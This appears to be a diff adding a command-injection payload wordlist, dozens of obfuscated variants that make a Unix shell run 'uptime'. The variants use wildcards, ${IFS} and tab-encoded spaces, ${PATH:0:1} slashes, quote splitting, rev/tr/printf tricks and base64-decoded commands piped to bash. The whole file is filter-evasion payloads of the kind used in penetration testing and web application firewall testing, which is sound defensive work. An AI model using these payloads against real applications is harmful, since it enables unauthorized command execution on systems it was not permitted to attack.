@@ -1,0 +1,55 @@
+/usr/bin/up[t]ime
+${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}up[t]ime
+$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')usr$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')bin$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')up[t]ime
+$(echo%09.%09|%09tr%09'!-0'%09'"-1')usr$(echo%09.%09|%09tr%09'!-0'%09'"-1')bin$(echo%09.%09|%09tr%09'!-0'%09'"-1')up[t]ime
+/usr/bin/up?ime
+${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}up?ime
+$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')usr$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')bin$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')up?ime
+$(echo%09.%09|%09tr%09'!-0'%09'"-1')usr$(echo%09.%09|%09tr%09'!-0'%09'"-1')bin$(echo%09.%09|%09tr%09'!-0'%09'"-1')up?ime
+/usr/bin/up*ime
+${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}up*ime
+$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')usr$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')bin$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')up*ime
+$(echo%09.%09|%09tr%09'!-0'%09'"-1')usr$(echo%09.%09|%09tr%09'!-0'%09'"-1')bin$(echo%09.%09|%09tr%09'!-0'%09'"-1')up*ime
+u${x}pti${x}me
+u''ptime
+eval "u''ptime"
+e$@val "up$(tr '!-}' '"-~'<<<\!)$(tr '!-}' '"-~'<<<\!)time"
+u""ptime
+u\p\t\ime
+eval "u\p\t\ime"
+e$@val "u$(tr '!-}' '"-~'<<<[)p$(tr '!-}' '"-~'<<<[)t$(tr '!-}' '"-~'<<<[)ime"
+u$()ptime
+u$@ptime
+$(r$@ev<<<'emitpu')
+$(r$@ev<<<"emitpu")
+`r$@ev<<<'emitpu'`
+`r$@ev<<<"emitpu"`
+$(t$@r '[A-Z]' '[a-z]'<<<'UPTIME')
+$(t$@r${IFS}"[A-Z]"${IFS}"[a-z]"<<<"UPTIME")
+$(t$@r${IFS}'[A-Z]'${IFS}'[a-z]'<<<'UPTIME')
+$(t$@r%09"[A-Z]"%09"[a-z]"<<<"UPTIME")
+$(t$@r%09'[A-Z]'%09'[a-z]'<<<'UPTIME')
+`t$@r "[A-Z]" "[a-z]"<<<"UPTIME"`
+`t$@r '[A-Z]' '[a-z]'<<<'UPTIME'`
+`t$@r${IFS}"[A-Z]"${IFS}"[a-z]"<<<"UPTIME"`
+`t$@r${IFS}'[A-Z]'${IFS}'[a-z]'<<<'UPTIME'`
+`t$@r%09"[A-Z]"%09"[a-z]"<<<"UPTIME"`
+`t$@r%09'[A-Z]'%09'[a-z]'<<<'UPTIME'`
+$(a="UPTIME";pr$@intf %s "${a,,}")
+$(a="DATE";pr$@intf${IFS}%s${IFS}"${a,,}")
+$(a="UPTIME";pr$@intf%09%s%09"${a,,}")
+`a='UPTIME';pr$@intf %s "${a,,}"`
+`a='UPTIME';pr$@intf${IFS}%s${IFS}"${a,,}"`
+`a='UPTIME';pr$@intf%09%s%09"${a,,}"`
+b$@ash<<<$(ba$@se64 -d<<<dXB0aW1lCg==)
+b$@ash<<<$(ba$@se64${IFS}-d<<<dXB0aW1lCg==)
+b$@ash<<<$(ba$@se64%09%-d<<<dXB0aW1lCg==)
+b$@ash<<<`ba$@se64 -d<<<dXB0aW1lCg==`
+b$@ash<<<`ba$@se64${IFS}-d<<<dXB0aW1lCg==`
+b$@ash<<<`ba$@se64%09-d<<<dXB0aW1lCg==`
+b$@ash -c $(ba$@se64 -d<<<dXB0aW1lCg==)
+b$@ash${IFS}-c${IFS}$(ba$@se64${IFS}-d<<<dXB0aW1lCg==)
+b$@ash%09-c%09$(ba$@se64%09-d<<<dXB0aW1lCg==)
+b$@ash -c `ba$@se64 -d<<<dXB0aW1lCg==`
+b$@ash${IFS}-c${IFS}`ba$@se64${IFS}-d<<<dXB0aW1lCg==`
+b$@ash%09-c%09`ba$@se64%09-d<<<dXB0aW1lCg==`
